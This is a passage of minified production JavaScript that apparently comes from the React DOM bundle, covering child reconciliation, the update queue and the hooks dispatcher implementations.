        Error(S(31, t === "[object Object]" ? "object with keys {" + Object.keys(e).join(", ") + "}" : t)))
    );
}
function nc(t) {
    var e = t._init;
    return e(t._payload);
}
function vh(t) {
    function e(g, p) {
        if (t) {
            var m = g.deletions;
            m === null ? ((g.deletions = [p]), (g.flags |= 16)) : m.push(p);
        }
    }
    function n(g, p) {
        if (!t) return null;
        for (; p !== null; ) e(g, p), (p = p.sibling);
        return null;
    }
    function r(g, p) {
        for (g = new Map(); p !== null; ) p.key !== null ? g.set(p.key, p) : g.set(p.index, p), (p = p.sibling);
        return g;
    }
    function s(g, p) {
        return (g = Jt(g, p)), (g.index = 0), (g.sibling = null), g;
    }
    function i(g, p, m) {
        return (
            (g.index = m),
            t
                ? ((m = g.alternate),
                  m !== null ? ((m = m.index), m < p ? ((g.flags |= 2), p) : m) : ((g.flags |= 2), p))
                : ((g.flags |= 1048576), p)
        );
    }
    function o(g) {
        return t && g.alternate === null && (g.flags |= 2), g;
    }
    function a(g, p, m, w) {
        return p === null || p.tag !== 6
            ? ((p = Fo(m, g.mode, w)), (p.return = g), p)
            : ((p = s(p, m)), (p.return = g), p);
    }
    function l(g, p, m, w) {
        var k = m.type;
        return k === zn
            ? d(g, p, m.props.children, w, m.key)
            : p !== null &&
                (p.elementType === k || (typeof k == "object" && k !== null && k.$$typeof === It && nc(k) === p.type))
              ? ((w = s(p, m.props)), (w.ref = Er(g, p, m)), (w.return = g), w)
              : ((w = oi(m.type, m.key, m.props, null, g.mode, w)), (w.ref = Er(g, p, m)), (w.return = g), w);
    }
    function c(g, p, m, w) {
        return p === null ||
            p.tag !== 4 ||
            p.stateNode.containerInfo !== m.containerInfo ||
            p.stateNode.implementation !== m.implementation
            ? ((p = Bo(m, g.mode, w)), (p.return = g), p)
            : ((p = s(p, m.children || [])), (p.return = g), p);
    }
    function d(g, p, m, w, k) {
        return p === null || p.tag !== 7
            ? ((p = xn(m, g.mode, w, k)), (p.return = g), p)
            : ((p = s(p, m)), (p.return = g), p);
    }
    function h(g, p, m) {
        if ((typeof p == "string" && p !== "") || typeof p == "number")
            return (p = Fo("" + p, g.mode, m)), (p.return = g), p;
        if (typeof p == "object" && p !== null) {
            switch (p.$$typeof) {
                case Cs:
                    return (
                        (m = oi(p.type, p.key, p.props, null, g.mode, m)), (m.ref = Er(g, null, p)), (m.return = g), m
                    );
                case Dn:
                    return (p = Bo(p, g.mode, m)), (p.return = g), p;
                case It:
                    var w = p._init;
                    return h(g, w(p._payload), m);
            }
            if (Or(p) || _r(p)) return (p = xn(p, g.mode, m, null)), (p.return = g), p;
            Ds(g, p);
        }
        return null;
    }
    function f(g, p, m, w) {
        var k = p !== null ? p.key : null;
        if ((typeof m == "string" && m !== "") || typeof m == "number") return k !== null ? null : a(g, p, "" + m, w);
        if (typeof m == "object" && m !== null) {
            switch (m.$$typeof) {
                case Cs:
                    return m.key === k ? l(g, p, m, w) : null;
                case Dn:
                    return m.key === k ? c(g, p, m, w) : null;
                case It:
                    return (k = m._init), f(g, p, k(m._payload), w);
            }
            if (Or(m) || _r(m)) return k !== null ? null : d(g, p, m, w, null);
            Ds(g, m);
        }
        return null;
    }
    function v(g, p, m, w, k) {
        if ((typeof w == "string" && w !== "") || typeof w == "number")
            return (g = g.get(m) || null), a(p, g, "" + w, k);
        if (typeof w == "object" && w !== null) {
            switch (w.$$typeof) {
                case Cs:
                    return (g = g.get(w.key === null ? m : w.key) || null), l(p, g, w, k);
                case Dn:
                    return (g = g.get(w.key === null ? m : w.key) || null), c(p, g, w, k);
                case It:
                    var j = w._init;
                    return v(g, p, m, j(w._payload), k);
            }
            if (Or(w) || _r(w)) return (g = g.get(m) || null), d(p, g, w, k, null);
            Ds(p, w);
        }
        return null;
    }
    function y(g, p, m, w) {
        for (var k = null, j = null, N = p, E = (p = 0), U = null; N !== null && E < m.length; E++) {
            N.index > E ? ((U = N), (N = null)) : (U = N.sibling);
            var I = f(g, N, m[E], w);
            if (I === null) {
                N === null && (N = U);
                break;
            }
            t && N && I.alternate === null && e(g, N),
                (p = i(I, p, E)),
                j === null ? (k = I) : (j.sibling = I),
                (j = I),
                (N = U);
        }
        if (E === m.length) return n(g, N), K && ln(g, E), k;
        if (N === null) {
            for (; E < m.length; E++)
                (N = h(g, m[E], w)), N !== null && ((p = i(N, p, E)), j === null ? (k = N) : (j.sibling = N), (j = N));
            return K && ln(g, E), k;
        }
        for (N = r(g, N); E < m.length; E++)
            (U = v(N, g, E, m[E], w)),
                U !== null &&
                    (t && U.alternate !== null && N.delete(U.key === null ? E : U.key),
                    (p = i(U, p, E)),
                    j === null ? (k = U) : (j.sibling = U),
                    (j = U));
        return (
            t &&
                N.forEach(function (fe) {
                    return e(g, fe);
                }),
            K && ln(g, E),
            k
        );
    }
    function _(g, p, m, w) {
        var k = _r(m);
        if (typeof k != "function") throw Error(S(150));
        if (((m = k.call(m)), m == null)) throw Error(S(151));
        for (var j = (k = null), N = p, E = (p = 0), U = null, I = m.next(); N !== null && !I.done; E++, I = m.next()) {
            N.index > E ? ((U = N), (N = null)) : (U = N.sibling);
            var fe = f(g, N, I.value, w);
            if (fe === null) {
                N === null && (N = U);
                break;
            }
            t && N && fe.alternate === null && e(g, N),
                (p = i(fe, p, E)),
                j === null ? (k = fe) : (j.sibling = fe),
                (j = fe),
                (N = U);
        }
        if (I.done) return n(g, N), K && ln(g, E), k;
        if (N === null) {
            for (; !I.done; E++, I = m.next())
                (I = h(g, I.value, w)),
                    I !== null && ((p = i(I, p, E)), j === null ? (k = I) : (j.sibling = I), (j = I));
            return K && ln(g, E), k;
        }
        for (N = r(g, N); !I.done; E++, I = m.next())
            (I = v(N, g, E, I.value, w)),
                I !== null &&
                    (t && I.alternate !== null && N.delete(I.key === null ? E : I.key),
                    (p = i(I, p, E)),
                    j === null ? (k = I) : (j.sibling = I),
                    (j = I));
        return (
            t &&
                N.forEach(function (it) {
                    return e(g, it);
                }),
            K && ln(g, E),
            k
        );
    }
    function b(g, p, m, w) {
        if (
            (typeof m == "object" && m !== null && m.type === zn && m.key === null && (m = m.props.children),
            typeof m == "object" && m !== null)
        ) {
            switch (m.$$typeof) {
                case Cs:
                    e: {
                        for (var k = m.key, j = p; j !== null; ) {
                            if (j.key === k) {
                                if (((k = m.type), k === zn)) {
                                    if (j.tag === 7) {
                                        n(g, j.sibling), (p = s(j, m.props.children)), (p.return = g), (g = p);
                                        break e;
                                    }
                                } else if (
                                    j.elementType === k ||
                                    (typeof k == "object" && k !== null && k.$$typeof === It && nc(k) === j.type)
                                ) {
                                    n(g, j.sibling),
                                        (p = s(j, m.props)),
                                        (p.ref = Er(g, j, m)),
                                        (p.return = g),
                                        (g = p);
                                    break e;
                                }
                                n(g, j);
                                break;
                            } else e(g, j);
                            j = j.sibling;
                        }
                        m.type === zn
                            ? ((p = xn(m.props.children, g.mode, w, m.key)), (p.return = g), (g = p))
                            : ((w = oi(m.type, m.key, m.props, null, g.mode, w)),
                              (w.ref = Er(g, p, m)),
                              (w.return = g),
                              (g = w));
                    }
                    return o(g);
                case Dn:
                    e: {
                        for (j = m.key; p !== null; ) {
                            if (p.key === j)
                                if (
                                    p.tag === 4 &&
                                    p.stateNode.containerInfo === m.containerInfo &&
                                    p.stateNode.implementation === m.implementation
                                ) {
                                    n(g, p.sibling), (p = s(p, m.children || [])), (p.return = g), (g = p);
                                    break e;
                                } else {
                                    n(g, p);
                                    break;
                                }
                            else e(g, p);
                            p = p.sibling;
                        }
                        (p = Bo(m, g.mode, w)), (p.return = g), (g = p);
                    }
                    return o(g);
                case It:
                    return (j = m._init), b(g, p, j(m._payload), w);
            }
            if (Or(m)) return y(g, p, m, w);
            if (_r(m)) return _(g, p, m, w);
            Ds(g, m);
        }
        return (typeof m == "string" && m !== "") || typeof m == "number"
            ? ((m = "" + m),
              p !== null && p.tag === 6
                  ? (n(g, p.sibling), (p = s(p, m)), (p.return = g), (g = p))
                  : (n(g, p), (p = Fo(m, g.mode, w)), (p.return = g), (g = p)),
              o(g))
            : n(g, p);
    }
    return b;
}
var ar = vh(!0),
    yh = vh(!1),
    ki = en(null),
    Si = null,
    Kn = null,
    Il = null;
function Al() {
    Il = Kn = Si = null;
}
function Ll(t) {
    var e = ki.current;
    q(ki), (t._currentValue = e);
}
function $a(t, e, n) {
    for (; t !== null; ) {
        var r = t.alternate;
        if (
            ((t.childLanes & e) !== e
                ? ((t.childLanes |= e), r !== null && (r.childLanes |= e))
                : r !== null && (r.childLanes & e) !== e && (r.childLanes |= e),
            t === n)
        )
            break;
        t = t.return;
    }
}
function tr(t, e) {
    (Si = t),
        (Il = Kn = null),
        (t = t.dependencies),
        t !== null && t.firstContext !== null && (t.lanes & e && (Pe = !0), (t.firstContext = null));
}
function Ke(t) {
    var e = t._currentValue;
    if (Il !== t)
        if (((t = { context: t, memoizedValue: e, next: null }), Kn === null)) {
            if (Si === null) throw Error(S(308));
            (Kn = t), (Si.dependencies = { lanes: 0, firstContext: t });
        } else Kn = Kn.next = t;
    return e;
}
var gn = null;
function Ml(t) {
    gn === null ? (gn = [t]) : gn.push(t);
}
function xh(t, e, n, r) {
    var s = e.interleaved;
    return s === null ? ((n.next = n), Ml(e)) : ((n.next = s.next), (s.next = n)), (e.interleaved = n), St(t, r);
}
function St(t, e) {
    t.lanes |= e;
    var n = t.alternate;
    for (n !== null && (n.lanes |= e), n = t, t = t.return; t !== null; )
        (t.childLanes |= e), (n = t.alternate), n !== null && (n.childLanes |= e), (n = t), (t = t.return);
    return n.tag === 3 ? n.stateNode : null;
}
var At = !1;
function Ul(t) {
    t.updateQueue = {
        baseState: t.memoizedState,
        firstBaseUpdate: null,
        lastBaseUpdate: null,
        shared: { pending: null, interleaved: null, lanes: 0 },
        effects: null,
    };
}
function wh(t, e) {
    (t = t.updateQueue),
        e.updateQueue === t &&
            (e.updateQueue = {
                baseState: t.baseState,
                firstBaseUpdate: t.firstBaseUpdate,
                lastBaseUpdate: t.lastBaseUpdate,
                shared: t.shared,
                effects: t.effects,
            });
}
function _t(t, e) {
    return { eventTime: t, lane: e, tag: 0, payload: null, callback: null, next: null };
}
function Gt(t, e, n) {
    var r = t.updateQueue;
    if (r === null) return null;
    if (((r = r.shared), M & 2)) {
        var s = r.pending;
        return s === null ? (e.next = e) : ((e.next = s.next), (s.next = e)), (r.pending = e), St(t, n);
    }
    return (
        (s = r.interleaved),
        s === null ? ((e.next = e), Ml(r)) : ((e.next = s.next), (s.next = e)),
        (r.interleaved = e),
        St(t, n)
    );
}
function ei(t, e, n) {
    if (((e = e.updateQueue), e !== null && ((e = e.shared), (n & 4194240) !== 0))) {
        var r = e.lanes;
        (r &= t.pendingLanes), (n |= r), (e.lanes = n), kl(t, n);
    }
}
function rc(t, e) {
    var n = t.updateQueue,
        r = t.alternate;
    if (r !== null && ((r = r.updateQueue), n === r)) {
        var s = null,
            i = null;
        if (((n = n.firstBaseUpdate), n !== null)) {
            do {
                var o = {
                    eventTime: n.eventTime,
                    lane: n.lane,
                    tag: n.tag,
                    payload: n.payload,
                    callback: n.callback,
                    next: null,
                };
                i === null ? (s = i = o) : (i = i.next = o), (n = n.next);
            } while (n !== null);
            i === null ? (s = i = e) : (i = i.next = e);
        } else s = i = e;
        (n = { baseState: r.baseState, firstBaseUpdate: s, lastBaseUpdate: i, shared: r.shared, effects: r.effects }),
            (t.updateQueue = n);
        return;
    }
    (t = n.lastBaseUpdate), t === null ? (n.firstBaseUpdate = e) : (t.next = e), (n.lastBaseUpdate = e);
}
function ji(t, e, n, r) {
    var s = t.updateQueue;
    At = !1;
    var i = s.firstBaseUpdate,
        o = s.lastBaseUpdate,
        a = s.shared.pending;
    if (a !== null) {
        s.shared.pending = null;
        var l = a,
            c = l.next;
        (l.next = null), o === null ? (i = c) : (o.next = c), (o = l);
        var d = t.alternate;
        d !== null &&
            ((d = d.updateQueue),
            (a = d.lastBaseUpdate),
            a !== o && (a === null ? (d.firstBaseUpdate = c) : (a.next = c), (d.lastBaseUpdate = l)));
    }
    if (i !== null) {
        var h = s.baseState;
        (o = 0), (d = c = l = null), (a = i);
        do {
            var f = a.lane,
                v = a.eventTime;
            if ((r & f) === f) {
                d !== null &&
                    (d = d.next =
                        { eventTime: v, lane: 0, tag: a.tag, payload: a.payload, callback: a.callback, next: null });
                e: {
                    var y = t,
                        _ = a;
                    switch (((f = e), (v = n), _.tag)) {
                        case 1:
                            if (((y = _.payload), typeof y == "function")) {
                                h = y.call(v, h, f);
                                break e;
                            }
                            h = y;
                            break e;
                        case 3:
                            y.flags = (y.flags & -65537) | 128;
                        case 0:
                            if (((y = _.payload), (f = typeof y == "function" ? y.call(v, h, f) : y), f == null))
                                break e;
                            h = X({}, h, f);
                            break e;
                        case 2:
                            At = !0;
                    }
                }
                a.callback !== null &&
                    a.lane !== 0 &&
                    ((t.flags |= 64), (f = s.effects), f === null ? (s.effects = [a]) : f.push(a));
            } else
                (v = { eventTime: v, lane: f, tag: a.tag, payload: a.payload, callback: a.callback, next: null }),
                    d === null ? ((c = d = v), (l = h)) : (d = d.next = v),
                    (o |= f);
            if (((a = a.next), a === null)) {
                if (((a = s.shared.pending), a === null)) break;
                (f = a), (a = f.next), (f.next = null), (s.lastBaseUpdate = f), (s.shared.pending = null);
            }
        } while (!0);
        if (
            (d === null && (l = h),
            (s.baseState = l),
            (s.firstBaseUpdate = c),
            (s.lastBaseUpdate = d),
            (e = s.shared.interleaved),
            e !== null)
        ) {
            s = e;
            do (o |= s.lane), (s = s.next);
            while (s !== e);
        } else i === null && (s.shared.lanes = 0);
        (Sn |= o), (t.lanes = o), (t.memoizedState = h);
    }
}
function sc(t, e, n) {
    if (((t = e.effects), (e.effects = null), t !== null))
        for (e = 0; e < t.length; e++) {
            var r = t[e],
                s = r.callback;
            if (s !== null) {
                if (((r.callback = null), (r = n), typeof s != "function")) throw Error(S(191, s));
                s.call(r);
            }
        }
}
var xs = {},
    ft = en(xs),
    os = en(xs),
    as = en(xs);
function vn(t) {
    if (t === xs) throw Error(S(174));
    return t;
}
function Dl(t, e) {
    switch ((V(as, e), V(os, t), V(ft, xs), (t = e.nodeType), t)) {
        case 9:
        case 11:
            e = (e = e.documentElement) ? e.namespaceURI : fa(null, "");
            break;
        default:
            (t = t === 8 ? e.parentNode : e), (e = t.namespaceURI || null), (t = t.tagName), (e = fa(e, t));
    }
    q(ft), V(ft, e);
}
function lr() {
    q(ft), q(os), q(as);
}
function _h(t) {
    vn(as.current);
    var e = vn(ft.current),
        n = fa(e, t.type);
    e !== n && (V(os, t), V(ft, n));
}
function zl(t) {
    os.current === t && (q(ft), q(os));
}
var Q = en(0);
function Ei(t) {
    for (var e = t; e !== null; ) {
        if (e.tag === 13) {
            var n = e.memoizedState;
            if (n !== null && ((n = n.dehydrated), n === null || n.data === "$?" || n.data === "$!")) return e;
        } else if (e.tag === 19 && e.memoizedProps.revealOrder !== void 0) {
            if (e.flags & 128) return e;
        } else if (e.child !== null) {
            (e.child.return = e), (e = e.child);
            continue;
        }
        if (e === t) break;
        for (; e.sibling === null; ) {
            if (e.return === null || e.return === t) return null;
            e = e.return;
        }
        (e.sibling.return = e.return), (e = e.sibling);
    }
    return null;
}
var Ao = [];
function Fl() {
    for (var t = 0; t < Ao.length; t++) Ao[t]._workInProgressVersionPrimary = null;
    Ao.length = 0;
}
var ti = Et.ReactCurrentDispatcher,
    Lo = Et.ReactCurrentBatchConfig,
    kn = 0,
    J = null,
    ie = null,
    ae = null,
    Ni = !1,
    Fr = !1,
    ls = 0,
    h0 = 0;
function ge() {
    throw Error(S(321));
}
function Bl(t, e) {
    if (e === null) return !1;
    for (var n = 0; n < e.length && n < t.length; n++) if (!st(t[n], e[n])) return !1;
    return !0;
}
function Vl(t, e, n, r, s, i) {
    if (
        ((kn = i),
        (J = e),
        (e.memoizedState = null),
        (e.updateQueue = null),
        (e.lanes = 0),
        (ti.current = t === null || t.memoizedState === null ? g0 : v0),
        (t = n(r, s)),
        Fr)
    ) {
        i = 0;
        do {
            if (((Fr = !1), (ls = 0), 25 <= i)) throw Error(S(301));
            (i += 1), (ae = ie = null), (e.updateQueue = null), (ti.current = y0), (t = n(r, s));
        } while (Fr);
    }
    if (((ti.current = Ci), (e = ie !== null && ie.next !== null), (kn = 0), (ae = ie = J = null), (Ni = !1), e))
        throw Error(S(300));
    return t;
}
function Wl() {
    var t = ls !== 0;
    return (ls = 0), t;
}
function ut() {
    var t = { memoizedState: null, baseState: null, baseQueue: null, queue: null, next: null };
    return ae === null ? (J.memoizedState = ae = t) : (ae = ae.next = t), ae;
}
function Qe() {
    if (ie === null) {
        var t = J.alternate;
        t = t !== null ? t.memoizedState : null;
    } else t = ie.next;
    var e = ae === null ? J.memoizedState : ae.next;
    if (e !== null) (ae = e), (ie = t);
    else {
        if (t === null) throw Error(S(310));
        (ie = t),
            (t = {
                memoizedState: ie.memoizedState,
                baseState: ie.baseState,
                baseQueue: ie.baseQueue,
                queue: ie.queue,
                next: null,
            }),
            ae === null ? (J.memoizedState = ae = t) : (ae = ae.next = t);
    }
    return ae;
}
function us(t, e) {
    return typeof e == "function" ? e(t) : e;
}
function Mo(t) {
    var e = Qe(),
        n = e.queue;
    if (n === null) throw Error(S(311));
    n.lastRenderedReducer = t;
    var r = ie,
        s = r.baseQueue,
        i = n.pending;
    if (i !== null) {
        if (s !== null) {
            var o = s.next;
            (s.next = i.next), (i.next = o);
        }
        (r.baseQueue = s = i), (n.pending = null);
    }
    if (s !== null) {
        (i = s.next), (r = r.baseState);
        var a = (o = null),
            l = null,
            c = i;
        do {
            var d = c.lane;
            if ((kn & d) === d)
                l !== null &&
                    (l = l.next =
                        {
                            lane: 0,
                            action: c.action,
                            hasEagerState: c.hasEagerState,
                            eagerState: c.eagerState,
                            next: null,
                        }),
                    (r = c.hasEagerState ? c.eagerState : t(r, c.action));
            else {
                var h = {
                    lane: d,
                    action: c.action,
                    hasEagerState: c.hasEagerState,
                    eagerState: c.eagerState,
                    next: null,
                };
                l === null ? ((a = l = h), (o = r)) : (l = l.next = h), (J.lanes |= d), (Sn |= d);
            }
            c = c.next;
        } while (c !== null && c !== i);
        l === null ? (o = r) : (l.next = a),
            st(r, e.memoizedState) || (Pe = !0),
            (e.memoizedState = r),
            (e.baseState = o),
            (e.baseQueue = l),
            (n.lastRenderedState = r);
    }
    if (((t = n.interleaved), t !== null)) {
        s = t;
        do (i = s.lane), (J.lanes |= i), (Sn |= i), (s = s.next);
        while (s !== t);
    } else s === null && (n.lanes = 0);
    return [e.memoizedState, n.dispatch];
}
function Uo(t) {
    var e = Qe(),
        n = e.queue;
    if (n === null) throw Error(S(311));
    n.lastRenderedReducer = t;
    var r = n.dispatch,
        s = n.pending,
        i = e.memoizedState;
    if (s !== null) {
        n.pending = null;
        var o = (s = s.next);
        do (i = t(i, o.action)), (o = o.next);
        while (o !== s);
        st(i, e.memoizedState) || (Pe = !0),
            (e.memoizedState = i),
            e.baseQueue === null && (e.baseState = i),
            (n.lastRenderedState = i);
    }
    return [i, r];
}
function bh() {}
function kh(t, e) {
    var n = J,
        r = Qe(),
        s = e(),
        i = !st(r.memoizedState, s);
    if (
        (i && ((r.memoizedState = s), (Pe = !0)),
        (r = r.queue),
        Hl(Eh.bind(null, n, r, t), [t]),
        r.getSnapshot !== e || i || (ae !== null && ae.memoizedState.tag & 1))
    ) {
        if (((n.flags |= 2048), cs(9, jh.bind(null, n, r, s, e), void 0, null), le === null)) throw Error(S(349));
        kn & 30 || Sh(n, e, s);
    }
    return s;
}
function Sh(t, e, n) {
    (t.flags |= 16384),
        (t = { getSnapshot: e, value: n }),
        (e = J.updateQueue),
        e === null
            ? ((e = { lastEffect: null, stores: null }), (J.updateQueue = e), (e.stores = [t]))
            : ((n = e.stores), n === null ? (e.stores = [t]) : n.push(t));
}
function jh(t, e, n, r) {
    (e.value = n), (e.getSnapshot = r), Nh(e) && Ch(t);
}
function Eh(t, e, n) {
    return n(function () {
        Nh(e) && Ch(t);
    });
}
function Nh(t) {
    var e = t.getSnapshot;
    t = t.value;
    try {
        var n = e();
        return !st(t, n);
    } catch {
        return !0;
    }
}
function Ch(t) {
    var e = St(t, 1);
    e !== null && rt(e, t, 1, -1);
}
function ic(t) {
    var e = ut();
    return (
        typeof t == "function" && (t = t()),
        (e.memoizedState = e.baseState = t),
        (t = {
            pending: null,
            interleaved: null,
            lanes: 0,
            dispatch: null,
            lastRenderedReducer: us,
            lastRenderedState: t,
        }),
        (e.queue = t),
        (t = t.dispatch = m0.bind(null, J, t)),
        [e.memoizedState, t]
    );
}
function cs(t, e, n, r) {
    return (
        (t = { tag: t, create: e, destroy: n, deps: r, next: null }),
        (e = J.updateQueue),
        e === null
            ? ((e = { lastEffect: null, stores: null }), (J.updateQueue = e), (e.lastEffect = t.next = t))
            : ((n = e.lastEffect),
              n === null
                  ? (e.lastEffect = t.next = t)
                  : ((r = n.next), (n.next = t), (t.next = r), (e.lastEffect = t))),
        t
    );
}
function Ph() {
    return Qe().memoizedState;
}
function ni(t, e, n, r) {
    var s = ut();
    (J.flags |= t), (s.memoizedState = cs(1 | e, n, void 0, r === void 0 ? null : r));
}
function qi(t, e, n, r) {
    var s = Qe();
    r = r === void 0 ? null : r;
    var i = void 0;
    if (ie !== null) {
        var o = ie.memoizedState;
        if (((i = o.destroy), r !== null && Bl(r, o.deps))) {
            s.memoizedState = cs(e, n, i, r);
            return;
        }
    }
    (J.flags |= t), (s.memoizedState = cs(1 | e, n, i, r));
}
function oc(t, e) {
    return ni(8390656, 8, t, e);
}
function Hl(t, e) {
    return qi(2048, 8, t, e);
}
function Th(t, e) {
    return qi(4, 2, t, e);
}
function Rh(t, e) {
    return qi(4, 4, t, e);
}
function Oh(t, e) {
    if (typeof e == "function")
        return (
            (t = t()),
            e(t),
            function () {
                e(null);
            }
        );
    if (e != null)
        return (
            (t = t()),
            (e.current = t),
            function () {
                e.current = null;
            }
        );
}
function $h(t, e, n) {
    return (n = n != null ? n.concat([t]) : null), qi(4, 4, Oh.bind(null, e, t), n);
}
function ql() {}
function Ih(t, e) {
    var n = Qe();
    e = e === void 0 ? null : e;
    var r = n.memoizedState;
    return r !== null && e !== null && Bl(e, r[1]) ? r[0] : ((n.memoizedState = [t, e]), t);
}
function Ah(t, e) {
    var n = Qe();
    e = e === void 0 ? null : e;
    var r = n.memoizedState;
    return r !== null && e !== null && Bl(e, r[1]) ? r[0] : ((t = t()), (n.memoizedState = [t, e]), t);
}
function Lh(t, e, n) {
    return kn & 21
        ? (st(n, e) || ((n = Fd()), (J.lanes |= n), (Sn |= n), (t.baseState = !0)), e)
        : (t.baseState && ((t.baseState = !1), (Pe = !0)), (t.memoizedState = n));
}
function f0(t, e) {
    var n = D;
    (D = n !== 0 && 4 > n ? n : 4), t(!0);
    var r = Lo.transition;
    Lo.transition = {};
    try {
        t(!1), e();
    } finally {
        (D = n), (Lo.transition = r);
    }
}
function Mh() {
    return Qe().memoizedState;
}
function p0(t, e, n) {
    var r = Qt(t);
    if (((n = { lane: r, action: n, hasEagerState: !1, eagerState: null, next: null }), Uh(t))) Dh(e, n);
    else if (((n = xh(t, e, n, r)), n !== null)) {
        var s = ke();
        rt(n, t, r, s), zh(n, e, r);
    }
}
function m0(t, e, n) {
    var r = Qt(t),
        s = { lane: r, action: n, hasEagerState: !1, eagerState: null, next: null };
    if (Uh(t)) Dh(e, s);
    else {
        var i = t.alternate;
        if (t.lanes === 0 && (i === null || i.lanes === 0) && ((i = e.lastRenderedReducer), i !== null))
            try {
                var o = e.lastRenderedState,
                    a = i(o, n);
                if (((s.hasEagerState = !0), (s.eagerState = a), st(a, o))) {
                    var l = e.interleaved;
                    l === null ? ((s.next = s), Ml(e)) : ((s.next = l.next), (l.next = s)), (e.interleaved = s);
                    return;
                }
            } catch {
            } finally {
            }
        (n = xh(t, e, s, r)), n !== null && ((s = ke()), rt(n, t, r, s), zh(n, e, r));
    }
}
function Uh(t) {
    var e = t.alternate;
    return t === J || (e !== null && e === J);
}
function Dh(t, e) {
    Fr = Ni = !0;
    var n = t.pending;
    n === null ? (e.next = e) : ((e.next = n.next), (n.next = e)), (t.pending = e);
}
function zh(t, e, n) {
    if (n & 4194240) {
        var r = e.lanes;
        (r &= t.pendingLanes), (n |= r), (e.lanes = n), kl(t, n);
    }
}
var Ci = {
        readContext: Ke,
        useCallback: ge,
        useContext: ge,
        useEffect: ge,
        useImperativeHandle: ge,
        useInsertionEffect: ge,
        useLayoutEffect: ge,
        useMemo: ge,
        useReducer: ge,
        useRef: ge,
        useState: ge,
        useDebugValue: ge,
        useDeferredValue: ge,
        useTransition: ge,
        useMutableSource: ge,
        useSyncExternalStore: ge,
        useId: ge,
        unstable_isNewReconciler: !1,
    },
    g0 = {
        readContext: Ke,
        useCallback: function (t, e) {
            return (ut().memoizedState = [t, e === void 0 ? null : e]), t;
        },
        useContext: Ke,
        useEffect: oc,
        useImperativeHandle: function (t, e, n) {
            return (n = n != null ? n.concat([t]) : null), ni(4194308, 4, Oh.bind(null, e, t), n);
        },
        useLayoutEffect: function (t, e) {
            return ni(4194308, 4, t, e);
        },
        useInsertionEffect: function (t, e) {
            return ni(4, 2, t, e);
        },
        useMemo: function (t, e) {
            var n = ut();
            return (e = e === void 0 ? null : e), (t = t()), (n.memoizedState = [t, e]), t;
        },
        useReducer: function (t, e, n) {
            var r = ut();
            return (
                (e = n !== void 0 ? n(e) : e),
                (r.memoizedState = r.baseState = e),
                (t = {
                    pending: null,
                    interleaved: null,
                    lanes: 0,
                    dispatch: null,
                    lastRenderedReducer: t,
                    lastRenderedState: e,
                }),
                (r.queue = t),
                (t = t.dispatch = p0.bind(null, J, t)),
                [r.memoizedState, t]
            );
        },
        useRef: function (t) {
            var e = ut();
            return (t = { current: t }), (e.memoizedState = t);
        },
        useState: ic,
        useDebugValue: ql,
        useDeferredValue: function (t) {
            return (ut().memoizedState = t);
        },
        useTransition: function () {
            var t = ic(!1),
                e = t[0];
            return (t = f0.bind(null, t[1])), (ut().memoizedState = t), [e, t];
        },
        useMutableSource: function () {},
        useSyncExternalStore: function (t, e, n) {
            var r = J,
                s = ut();
            if (K) {
                if (n === void 0) throw Error(S(407));
                n = n();
            } else {
                if (((n = e()), le === null)) throw Error(S(349));
                kn & 30 || Sh(r, e, n);
            }
            s.memoizedState = n;
            var i = { value: n, getSnapshot: e };
            return (
                (s.queue = i),
                oc(Eh.bind(null, r, i, t), [t]),
                (r.flags |= 2048),
                cs(9, jh.bind(null, r, i, n, e), void 0, null),
                n
            );
        },
        useId: function () {
            var t = ut(),
                e = le.identifierPrefix;
            if (K) {
                var n = wt,
                    r = xt;
                (n = (r & ~(1 << (32 - nt(r) - 1))).toString(32) + n),
                    (e = ":" + e + "R" + n),
                    (n = ls++),
                    0 < n && (e += "H" + n.toString(32)),
                    (e += ":");
            } else (n = h0++), (e = ":" + e + "r" + n.toString(32) + ":");
            return (t.memoizedState = e);
        },
        unstable_isNewReconciler: !1,
    },
    v0 = {
        readContext: Ke,
        useCallback: Ih,
        useContext: Ke,
        useEffect: Hl,
        useImperativeHandle: $h,
        useInsertionEffect: Th,
        useLayoutEffect: Rh,
        useMemo: Ah,
        useReducer: Mo,
        useRef: Ph,
        useState: function () {
            return Mo(us);
        },
        useDebugValue: ql,
        useDeferredValue: function (t) {
            var e = Qe();
            return Lh(e, ie.memoizedState, t);
        },
        useTransition: function () {
            var t = Mo(us)[0],
                e = Qe().memoizedState;
            return [t, e];
        },
        useMutableSource: bh,
        useSyncExternalStore: kh,
        useId: Mh,
        unstable_isNewReconciler: !1,
    },
    y0 = {
        readContext: Ke,
        useCallback: Ih,
        useContext: Ke,
        useEffect: Hl,
        useImperativeHandle: $h,
        useInsertionEffect: Th,
        useLayoutEffect: Rh,
        useMemo: Ah,
        useReducer: Uo,
        useRef: Ph,
        useState: function () {
            return Uo(us);
        },
        useDebugValue: ql,
        useDeferredValue: function (t) {
            var e = Qe();
            return ie === null ? (e.memoizedState = t) : Lh(e, ie.memoizedState, t);
        },
        useTransition: function () {
            var t = Uo(us)[0],
                e = Qe().memoizedState;
            return [t, e];
        },
        useMutableSource: bh,
        useSyncExternalStore: kh,
        useId: Mh,
        unstable_isNewReconciler: !1,
    };
function Ye(t, e) {
    if (t && t.defaultProps) {
        (e = X({}, e)), (t = t.defaultProps);
        for (var n in t) e[n] === void 0 && (e[n] = t[n]);
        return e;
    }
    return e;
}
function Ia(t, e, n, r) {
    (e = t.memoizedState),
        (n = n(r, e)),
        (n = n == null ? e : X({}, e, n)),
        (t.memoizedState = n),
        t.lanes === 0 && (t.updateQueue.baseState = n);
}
var Gi = {
    isMounted: function (t) {
        return (t = t._reactInternals) ? Nn(t) === t : !1;
    },
    enqueueSetState: function (t, e, n) {
        t = t._reactInternals;
        var r = ke(),
            s = Qt(t),
            i = _t(r, s);
        (i.payload = e), n != null && (i.callback = n), (e = Gt(t, i, s)), e !== null && (rt(e, t, s, r), ei(e, t, s));
    },
    enqueueReplaceState: function (t, e, n) {
        t = t._reactInternals;
        var r = ke(),
            s = Qt(t),
            i = _t(r, s);
        (i.tag = 1),
            (i.payload = e),
            n != null && (i.callback = n),
            (e = Gt(t, i, s)),
            e !== null && (rt(e, t, s, r), ei(e, t, s));
    },
    enqueueForceUpdate: function (t, e) {
        t = t._reactInternals;
        var n = ke(),
            r = Qt(t),
            s = _t(n, r);
        (s.tag = 2), e != null && (s.callback = e), (e = Gt(t, s, r)), e !== null && (rt(e, t, r, n), ei(e, t, r));
    },
};
function ac(t, e, n, r, s, i, o) {
    return (
        (t = t.stateNode),
        typeof t.shouldComponentUpdate == "function"
            ? t.shouldComponentUpdate(r, i, o)
            : e.prototype && e.prototype.isPureReactComponent
